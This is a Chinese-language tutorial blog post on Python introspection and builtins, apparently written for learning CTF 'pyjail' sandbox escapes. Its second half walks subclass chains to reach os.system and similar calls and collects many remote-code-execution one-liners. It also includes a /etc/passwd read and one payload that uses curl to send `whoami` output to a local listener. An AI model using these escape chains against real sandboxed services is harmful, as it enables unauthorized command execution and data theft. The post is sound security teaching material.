---
title: pyjail theory-01 内省机制
date: 2023-05-29 05:04:02
categories:
- Python
tags:
- pyjail
image:
  path: /assets/images/pyjail.jpg
toc: true
---

> - [内省机制](/posts/pyjail-theory-01-内省机制/)
> - [认识 sandbox](/posts/pyjail-theory-02-认识-sandbox/)
> - [逃逸目标](/posts/pyjail-theory-03-逃逸目标/)

## 认识 builtins
在 Python中，builtins 模块是一个特殊的模块，它包含了所有 Python 内置的函数、异常、常量和其他内置对象。

builtins 模块提供了对 Python 内置标识符的直接访问。这些内置标识符包括常用的函数（如 print()、len()）、数据类型（如 int()、str()）、异常类（如 ValueError），以及一些常量（如 True、False）。这些对象在 Python 解释器启动时就会自动加载，因此在任何地方都可以直接使用它们，而无需显式导入。

例如，以下两种方式调用内置函数是等价的：
```py
# 直接调用
print(len('abc'))  # 输出: 3

# 使用 builtins 模块
import builtins
print(builtins.len('abc'))  # 输出: 3
```

### 使用场景
1. 重写内置函数：如果你想重写一个内置函数，但仍然希望在某些情况下调用原始的内置函数，可以通过导入并使用builtins模块来实现。例如，重写文件读取函数：

    ```python
    import builtins
    
    def open(path):
        f = builtins.open(path, 'r')
        return f.read().upper()
    
    # 调用自定义的 open 函数
    print(open('example.txt'))
    ```
2. 动态执行代码时控制可用的内置函数：在使用诸如 eval() 或 exec() 等动态执行代码的场景中，可以通过传递自定义的全局和局部命名空间来控制哪些内置函数可用。这可以通过修改传递给这些函数的全局字典中的 `__builtins__` 键来实现。


## python 内省机制
Python 的内省（Introspection）是一种动态获取对象信息的能力。通过内省，我们可以查看对象的类型，查看它的属性和方法，以及它继承的类等等。这种灵活性使得 Python 成为一种非常强大的动态语言。

以下是 Python 内省的一些主要工具和技术：
### dir()

这个内置函数返回一个对象的所有属性和方法的列表，包括它从其父类继承的所有属性和方法。

   例如：
   ```python
   >>> dir("Hello World")
   ['__add__', '__class__', '__contains__', '__delattr__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__getitem__', '__getnewargs__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__iter__', '__le__', '__len__', '__lt__', '__mod__', '__mul__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__rmod__', '__rmul__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', 'capitalize', 'casefold', 'center', 'count', 'encode', 'endswith', 'expandtabs', 'find', 'format', 'format_map', 'index', 'isalnum', 'isalpha', 'isdecimal', 'isdigit', 'isidentifier', 'islower', 'isnumeric', 'isprintable', 'isspace', 'istitle', 'isupper', 'join', 'ljust', 'lower', 'lstrip', 'maketrans', 'partition', 'replace', 'rfind', 'rindex', 'rjust', 'rpartition', 'rsplit', 'rstrip', 'split', 'splitlines', 'startswith', 'strip', 'swapcase', 'title', 'translate', 'upper', 'zfill']
   ```

测试脚本：
```py
print("============ define variable")
a = 111
print(dir())
print("============ define variable")


print("============ import mudile")
import os
print(dir())
print("============ import mudile")


print("============ define func")
def test():
    b = 1111
    print(b)

print(dir())
print("============ define func")

print("============ define class")
class TestClass:
    def __init__(self):
        self.bbb = 1
        pass

print(dir())
print("============ define class")

print("============ dir int")
print(dir(1))
print("============ dir int")

print("============ dir str")
print(dir('1'))
print("============ dir str")

print("============ dir object")
print(dir(TestClass()))
print("============ dir object")

print("============ dir module")
print(dir(os))
print("============ dir module")
```

### type()
这个内置函数可以返回一个对象的类型。

   例如：
   ```python
   >>> type(123)
   <class 'int'>
   ```
测试脚本：
```py
print("============ type of Built-in Data Types")
print(type(1))
print(type('1'))
print(type(True))
print(type([]))
print(type({}))
print("============ type of Built-in Data Types")


print("============ type of imported mudile")
import os
print(type(os))
print("============ type of imported mudile")

print("============ type of function")
print(type(os.system))
print("============ type of function")


print("============ type of defined class")
class TestClass:
    def __init__(self):
        self.bbb = 1
        pass
print(type(TestClass))
print(type(TestClass()))
print("============ type of defined class")
```


### getattr(), setattr(), hasattr(), delattr()

这些内置函数用于获取、设置、检查和删除对象的属性。

   例如：
   ```python
   class MyClass:
     def __init__(self):
       self.my_attribute = 123

   my_instance = MyClass()

   >>> getattr(my_instance, 'my_attribute')
   123

   >>> setattr(my_instance, 'my_attribute', 456)
   >>> print(my_instance.my_attribute)
   456

   >>> hasattr(my_instance, 'my_attribute')
   True

   >>> delattr(my_instance, 'my_attribute')
   >>> hasattr(my_instance, 'my_attribute')
   False
   ```


### help()

这个函数提供了关于一个对象（如类、方法、模块等）的详细信息。

   例如：
   ```python
    >>> help(str)
    Help on list object:

    class list(object)
    |  list(iterable=(), /)
    |  
    |  Built-in mutable sequence.
    |  
    |  If no argument is given, the constructor creates a new empty list.
    |  The argument must be an iterable if specified.
    |  
    |  Methods defined here:
    |  
    |  __add__(self, value, /)
    |      Return self+value.
    |  
    |  __contains__(self, key, /)
    |      Return key in self.
    |  
    |  __delitem__(self, key, /)
    |      Delete self[key].
    |  
    |  __eq__(self, value, /)
    |      Return self==value.
    |  
    |  __ge__(self, value, /)
    |      Return self>=value.
    |  
    |  __getattribute__(self, name, /)
    |      Return getattr(self, name).
    |  
    |  __getitem__(...)
    |      x.__getitem__(y) <==> x[y]
    |  
    |  __gt__(self, value, /)
    |      Return self>value.
    |  
    |  __iadd__(self, value, /)
    |      Implement self+=value.
    |  
    |  __imul__(self, value, /)
    |      Implement self*=value.
    |  
    |  __init__(self, /, *args, **kwargs)
    |      Initialize self.  See help(type(self)) for accurate signature.
    |  
    |  __iter__(self, /)
    |      Implement iter(self).
    |  
    |  __le__(self, value, /)
    |      Return self<=value.
   ```

通过 help 函数可以找到这个类所有的方法定义以及属性, 可以看到其中有很多以 __ 开头的函数和属性, 这些函数和属性被称为魔术方法/属性.

测试脚本：
```py
help(1)
help(str)

import os
help(os)

class TestClass:
    def __call__(self, *args, **kwds):
        pass
    def __dir__(self):
        pass
help(TestClass)
```

### globals() 

### vars() 

所有 builtins 函数可见：[Built-in Functions — Python 3.13.0 documentation](https://docs.python.org/3/library/functions.html#)

## python 魔术方法/属性

在沙箱逃逸的场景中, 魔术方法也被经常使用.

### `__builtins__`
`__builtins__`： 是一个 builtins 模块的一个引用，其中包含 Python 的内置名称。这个模块自动在所有模块的全局命名空间中导入。当然我们也可以使用 `import builtins` 来导入

它包含许多基本函数（如 print、len 等）和基本类（如 object、int、list 等）。这就是可以在 Python 脚本中直接使用 print、len 等函数，而无需导入任何模块的原因。

我们可以使用 dir() 查看当前模块的属性列表. 其中就可以看到 `__builtins__`
```py
>>> dir()
['__annotations__', '__builtins__', '__doc__', '__loader__', '__name__', '__package__', '__spec__', 'subprocess']
```

我们可以使用 `dir(__builtins__)` 来查看 `__builtins__` 中包含的函数.
```
>>> dir(__builtins__)
['ArithmeticError', 'AssertionError', 'AttributeError', 'BaseException', 'BaseExceptionGroup', 'BlockingIOError', 'BrokenPipeError', 'BufferError', 'BytesWarning', 'ChildProcessError', 'ConnectionAbortedError', 'ConnectionError', 'ConnectionRefusedError', 'ConnectionResetError', 'DeprecationWarning', 'EOFError', 'Ellipsis', 'EncodingWarning', 'EnvironmentError', 'Exception', 'ExceptionGroup', 'False', 'FileExistsError', 'FileNotFoundError', 'FloatingPointError', 'FutureWarning', 'GeneratorExit', 'IOError', 'ImportError', 'ImportWarning', 'IndentationError', 'IndexError', 'InterruptedError', 'IsADirectoryError', 'KeyError', 'KeyboardInterrupt', 'LookupError', 'MemoryError', 'ModuleNotFoundError', 'NameError', 'None', 'NotADirectoryError', 'NotImplemented', 'NotImplementedError', 'OSError', 'OverflowError', 'PendingDeprecationWarning', 'PermissionError', 'ProcessLookupError', 'RecursionError', 'ReferenceError', 'ResourceWarning', 'RuntimeError', 'RuntimeWarning', 'StopAsyncIteration', 'StopIteration', 'SyntaxError', 'SyntaxWarning', 'SystemError', 'SystemExit', 'TabError', 'TimeoutError', 'True', 'TypeError', 'UnboundLocalError', 'UnicodeDecodeError', 'UnicodeEncodeError', 'UnicodeError', 'UnicodeTranslateError', 'UnicodeWarning', 'UserWarning', 'ValueError', 'Warning', 'ZeroDivisionError', '_', '__build_class__', '__debug__', '__doc__', '__import__', '__loader__', '__name__', '__package__', '__spec__', 'abs', 'aiter', 'all', 'anext', 'any', 'ascii', 'bin', 'bool', 'breakpoint', 'bytearray', 'bytes', 'callable', 'chr', 'classmethod', 'compile', 'complex', 'copyright', 'credits', 'delattr', 'dict', 'dir', 'divmod', 'enumerate', 'eval', 'exec', 'exit', 'filter', 'float', 'format', 'frozenset', 'getattr', 'globals', 'hasattr', 'hash', 'help', 'hex', 'id', 'input', 'int', 'isinstance', 'issubclass', 'iter', 'len', 'license', 'list', 'locals', 'map', 'max', 'memoryview', 'min', 'next', 'object', 'oct', 'open', 'ord', 'pow', 'print', 'property', 'quit', 'range', 'repr', 'reversed', 'round', 'set', 'setattr', 'slice', 'sorted', 'staticmethod', 'str', 'sum', 'super', 'tuple', 'type', 'vars', 'zip']
```

`__builtins__` 仅仅是 builtins 模块的引用，实际上是以 dict 的形式实现的。

测试脚本：
```py
print("============ define variable")
a = 111
print(dir())
print('__builtins__' in dir())
print("============ define variable")


print("============ import mudile")
import os
print(dir(os))
print('__builtins__' in dir(os))
print("============ import mudile")


print("============ define func")
def test():
    b = 1111
    print(b)

print(dir(test))
print('__builtins__' in dir(test))
print("============ define func")

print("============ define class")
class TestClass:
    def __init__(self):
        self.bbb = 1
        pass

print(dir(TestClass))
print('__builtins__' in dir(TestClass))
print("============ define class")


print("============ defer of __bultins__ and builtins")
print(type(os.__builtins__))

import builtins
print(type(builtins))
print("============ defer of __bultins__ and builtins")
```

### `__import__`

`__import__`接收字符串作为参数，导入该字符串名称的模块。

如import sys相当于`__import__('sys')`，另外由于参数是字符串的形式，因此在某些情况下可利用字符串拼接的方式Bypass过滤，如：

```py
__import__('o'+'s').system('ca'+'lc')。
```
### `__class__`
`__class__` 用于获取对象的类,例如:

```py
''.__class__ ## str 类
```

### `__bases__`

列出基类：

```py
''.__class__.__bases__
```
### `__mro__`

`__mro__`用于展示类的继承关系，类似于 bases：

```py
''.__class__.__mro__
```

### `__globals__`

`__globals__`是一个特殊属性，能够以 dict 的形式返回**函数**（注意是函数）所在模块命名空间的所有变量，其中包含了很多已经引入的 modules。

注意，某些内置函数并没有 `__globals__`属性，因为这些函数并不是 Python 代码定义的，而是用 C 语言或其他底层语言实现的，例如 os.system 函数

测试脚本：
```py
print("============ define func")
def test():
    a = 1
    b = 2
    return a,b

print(test.__globals__)

print("============ define class")
class TestClass:
    def test(self):
        a = 1
        b = 2
        return a,b
print(TestClass.test.__globals__)

print("============ define class")
class TestClass:
    def test(self):
        a = 1
        b = 2
        return a,b
print(TestClass.test.__globals__)

print("============ imported module")
import os
print(os.system.__globals__)
```
### `__init__`
`__init__` 是一个类的构造函数，当一个类被实例化时，它会被自动调用。我们也可以直接调用该函数进行实例化。


### `__subclasses__`
`__subclasses__` 函数可以获取到某个类所有子类。

```py
import requests
class Father(requests.Session):
    def test():
        pass

class Son(Father):
    def test():
        pass

print(Father.__subclasses__())
print(requests.Session.__subclasses__())
```
### `__dict__`
`__dict__` 是一个特殊的属性，它以字典形式存储对象的 可写属性。每个对象（包括类、实例、模块等）都有自己的 `__dict__` 属性，通常用于保存该对象的命名空间，即与该对象相关的所有属性和值。

比如当我们将 flag 字符声明在 `__main__` 模块时，就可以在 `__main__` 模块的 `__dict__` 属性中找到，与 globals() 函数的返回结果一致。
```py
import sys

sys.modules['__main__'].__dict__ == globals()
# True
```
### 其他
```py
__del__：一个类的析构函数，当一个对象被销毁时，它会被自动调用。

__str__ 和 __repr__：这两个方法用于定义对象的字符串表示形式。__str__ 是在使用 str() 函数或 print 语句时被调用的，而 __repr__ 是在使用 repr() 函数时被调用的。如果 __str__ 没有被定义，那么在需要的时候会使用 __repr__。

__eq__, __ne__, __lt__, __gt__, __le__, __ge__：这些方法用于定义对象的比较操作。

__add__, __sub__, __mul__, __div__, __mod__, __pow__：这些方法用于定义数学运算符的行为。

__getitem__, __setitem__, __delitem__：这些方法用于支持类似字典的索引和切片操作。

__iter__ 和 __next__：这两个方法用于定义一个迭代器。

__call__：这个方法使得一个实例可以像函数一样被调用。

__getattr__, __setattr__, __delattr__：这些方法用于控制属性访问。
```

## no builtins 构造
在前面的原理部分，我们可以很轻易地通过 `__import__` 这样的函数导入模块并执行危险函数，
```py
print(
    eval(input("code> "), 
         {"__builtins__": {}},
        {"__builtins__": {}}
        )
    )
```
但如果沙箱完全清空了 `__builtins__`, 则无法使用 import,如下：
```py
>>> eval("__import__", {"__builtins__": {}},{"__builtins__": {}})
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "<string>", line 1, in <module>
NameError: name '__import__' is not defined
>>> eval("__import__")
<built-in function __import__>

>>> exec("import os")
  File "<stdin>", line 1, in <module>
>>> exec("import os",{"__builtins__": {}},{"__builtins__": {}})
Traceback (most recent call last):
  File "<string>", line 1, in <module>
ImportError: __import__ not found
```

这种情况下我们就需要利用 python 内省机制来绕过，其步骤简单来说，就是通过內省 python 中的内置类重新获取 `__builtins__`，然后再进行利用

### 构造 payload 原理

构造 payload 的出发点一般是获取 object 类,终点在于此前所说的命令执行与文件操作函数.关键在于中间利用链如何寻找,一般过程如下:

1. 获取 object 类
2. 通过 `__subclasses__` 魔术方法获取 object 类的所有子类.
3. 在子类中寻找重载过的 `__init__` 函数的类,因为重载过的 `__init__` 函数的 `__globals__`属性会包含 `__builtins__` 键或者其他可利用的函数.
   1. 利用 `__builtins__`
      1. 通过 `.__init__.__globals__['__builtins__']` 键获取到 builtins 模块
      2. 由于 builtins 模块中包含了 file, eval 等函数,最后一步就是调用这些函数.
          下面是一个 payload 示例:
        ```py
        ''.__class__.__mro__[1].__subclasses__()[161].__init__.__globals__['__builtins__']['file']('E:/passwd').read()     
        ```
   1. 利用其他函数.
        因为 `__globals__` 中也会包含已经导入的模块,所以在某些子类的 `.__init__.__globals__` 中也会发现诸如 os 模块的身影,因此直接调用即可.下面是一个示例:
        
        ```py
        ''.__class__.__mro__[2].__subclasses__()[72].__init__.__globals__['os'].system('calc')
        ```


#### 获取 object 类
   ```py
    ''.__class__.__mro__[2]
    [].__class__.__mro__[1]
    {}.__class__.__mro__[1]
    ().__class__.__mro__[1]
    [].__class__.__mro__[-1]
    {}.__class__.__mro__[-1]
    ().__class__.__mro__[-1]
    {}.__class__.__bases__[0]
    ().__class__.__bases__[0]
    [].__class__.__bases__[0]
    [].__class__.__base__
    ().__class__.__base__
    {}.__class__.__base__
   ```
#### 获取 object 的子类
   ```py
    ''.__class__.__mro__[2].__subclasses__()
    [].__class__.__mro__[1].__subclasses__()
    {}.__class__.__mro__[1].__subclasses__()
    ().__class__.__mro__[1].__subclasses__()
    {}.__class__.__bases__[0].__subclasses__()
    ().__class__.__bases__[0].__subclasses__()
    [].__class__.__bases__[0].__subclasses__()
   ```
#### 找到重载过的`__init__`函数
```py
''.__class__.__mro__[2].__subclasses__()[59].__init__
```
在获取初始化属性后，带 wrapper 的说明没有重载，寻找不带 warpper 的，因为wrapper是指这些函数并没有被重载，这时它们并不是function，不具有`__globals__`属性。

我们可以通过下面的脚本来筛选重载过的 `__init__` 函数.
```py
l = len(''.__class__.__mro__[-1].__subclasses__())
for i in range(l):
    if 'wrapper' not in str(''.__class__.__mro__[-1].__subclasses__()[i].__init__):
        print (i, ''.__class__.__mro__[-1].__subclasses__()[i])
```
结果如下:
```
...
144 <class 'types.DynamicClassAttribute'>
145 <class 'types._GeneratorWrapper'>
146 <class 'warnings.WarningMessage'>
147 <class 'warnings.catch_warnings'>
173 <class 'reprlib.Repr'>
183 <class 'functools.partialmethod'>
184 <class 'functools.singledispatchmethod'>
185 <class 'functools.cached_property'>
188 <class 'contextlib._GeneratorContextManagerBase'>
189 <class 'contextlib._BaseExitStack'>
190 <class '_distutils_hack._TrivialRe'>
194 <class 'enum.nonmember'>
195 <class 'enum.member'>
197 <class 'enum.auto'>
198 <class 'enum._proto_member'>
199 <enum 'Enum'>
200 <class 'enum.verify'>
203 <class 'dis.Bytecode'>
207 <class 're._parser.State'>
208 <class 're._parser.SubPattern'>
209 <class 're._parser.Tokenizer'>
210 <class 're.Scanner'>
211 <class 'tokenize.Untokenizer'>
212 <class 'inspect.BlockFinder'>
215 <class 'inspect.Parameter'>
216 <class 'inspect.BoundArguments'>
217 <class 'inspect.Signature'>
218 <class 'rlcompleter.Completer'>
219 <class '_weakrefset._IterationGuard'>
220 <class '_weakrefset.WeakSet'>
```
#### 枚举 `__globals__`
得到重载过的 `__init__` 函数之后, 就可以通过 `__globals__` 枚举全局变量,例如:
```py
>>> 'os' in ''.__class__.__mro__[-1].__subclasses__()[261].__init__.__globals__.keys()
True
```

#### 调用 os、file 类
可以看到 os 模块是包含在内的,所以直接进行调用即可
```py
''.__class__.__mro__[-1].__subclasses__()[261].__init__.__globals__['os'].system('ls')
```
#### 获取 `__builtins__` 
如果没有 os 这个键,也可以搜索是否包含 `__builtins__`,如果包含则可以用 `__builtins__` 获取 builtins 模块执行诸如 open 等内置函数.

### 自动化构造

使用列表推导式就可以在不知道类的索引的情况下，获取符合条件的类并执行，例如：
```py
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" in x.__init__.__globals__ ][0]["os"].system("ls")
```

### payload 收集

#### RCE
```py
#os
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" in x.__init__.__globals__ ][0]["os"].system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" == x.__init__.__globals__["__name__"] ][0]["system"]("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'os." in str(x) ][0]['system']('ls')

#subprocess 
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "subprocess" == x.__init__.__globals__["__name__"] ][0]["Popen"]("ls")
[ x for x in ''.__class__.__base__.__subclasses__() if "'subprocess." in str(x) ][0]['Popen']('ls')
[ x for x in ''.__class__.__base__.__subclasses__() if x.__name__ == 'Popen'][0]('ls')

#builtins
globals()["__builtins__"]

[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"].__import__("os").system("ls")

#sys
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ][0]["sys"].modules["os"].system("ls")

[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'_sitebuiltins." in str(x) and not "_Helper" in str(x) ][0]["sys"].modules["os"].system("ls")

#commands (not very common)
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "commands" in x.__init__.__globals__ ][0]["commands"].getoutput("ls")

#pty (not very common)
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pty" in x.__init__.__globals__ ][0]["pty"].spawn("ls")

#importlib
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "importlib" in x.__init__.__globals__ ][0]["importlib"].import_module("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "importlib" in x.__init__.__globals__ ][0]["importlib"].__import__("os").system("ls")

#imp
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'imp." in str(x) ][0]["importlib"].import_module("os").system("ls")
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "'imp." in str(x) ][0]["importlib"].__import__("os").system("ls")

#pdb
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "pdb" in x.__init__.__globals__ ][0]["pdb"].os.system("ls")

# ctypes
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"].__import__('ctypes').CDLL(None).system('ls /'.encode())

# multiprocessing
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "builtins" in x.__init__.__globals__ ][0]["builtins"].__import__('multiprocessing').Process(target=lambda: __import__('os').system('curl localhost:9999/?a=`whoami`')).start()
```

但是上面的 payload 也存在一个问题，当 builtins 被完全清空时，无法使用 str 函数。这时候可以先在本地定位可以执行命令的类:
```py
>>> [ x for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "sys" in x.__init__.__globals__ ]
[<class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external.NamespaceLoader'>, <class '_frozen_importlib_external.FileFinder'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class '_distutils_hack._TrivialRe'>, <class 'enum.nonmember'>, <class 'enum.member'>, <class 'enum.auto'>, <class 'enum._proto_member'>, <enum 'Enum'>, <class 'enum.verify'>, <class 'dis.Bytecode'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>]
```
然后选取其中的一个类，获取 `__name__` 属性，然后直接限定为这个类
```py
>>> [ x for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" in x.__init__.__globals__ ][0]
<class 'contextlib._GeneratorContextManagerBase'>
>>> [ x for x in ''.__class__.__base__.__subclasses__() if "wrapper" not in str(x.__init__) and "os" in x.__init__.__globals__ ][0].__name__
'_GeneratorContextManagerBase'
>>> [ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__=="_GeneratorContextManagerBase" and "os" in x.__init__.__globals__ ][0]["os"].system("ls")
```

通常情况下，能够执行命令的类比较固定，其实也不需要用到上面这种列表推导式，最常见的 payload 是用到了 os._wrap_close 类。我们可以首先枚举 subclasses, os._wrap_close 一般会出现在倒数的几个位置。我本地的环境为 -5, os._wrap_close 可以直接通过 `__globals__` 获取到 system 函数，而不需要先获取 `__builtins__`
```py
().__class__.__base__.__subclasses__()
().__class__.__base__.__subclasses__()[-5]
().__class__.__base__.__subclasses__()[-5].__init__.__globals__['system']('ls')

# 使用列表推导式也没有问题
[ x.__init__.__globals__ for x in ''.__class__.__base__.__subclasses__() if x.__name__=="_wrap_close"][0]["system"]("ls")
```

#### FileRead
操作文件可以使用 builtins 中的 open，也可以使用 FileLoader 模块的 get_data 方法。
```py
[ x for x in ''.__class__.__base__.__subclasses__() if x.__name__=="FileLoader" ][0].get_data(0,"/etc/passwd")
```

## 参考资料
- [Python沙箱逃逸](https://www.cnblogs.com/h0cksr/p/16189741.html)
- [Python沙箱逃逸小结](https://www.mi1k7ea.com/2019/05/31/Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E5%B0%8F%E7%BB%93/)
- [Bypass Python sandboxes](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes)
- [[PyJail] python沙箱逃逸探究·上（HNCTF题解 - WEEK1）](https://zhuanlan.zhihu.com/p/578986988)
- [[PyJail] python沙箱逃逸探究·中（HNCTF题解 - WEEK2）](https://zhuanlan.zhihu.com/p/579057932)
- [[PyJail] python沙箱逃逸探究·下（HNCTF题解 - WEEK3）](https://zhuanlan.zhihu.com/p/579183067)
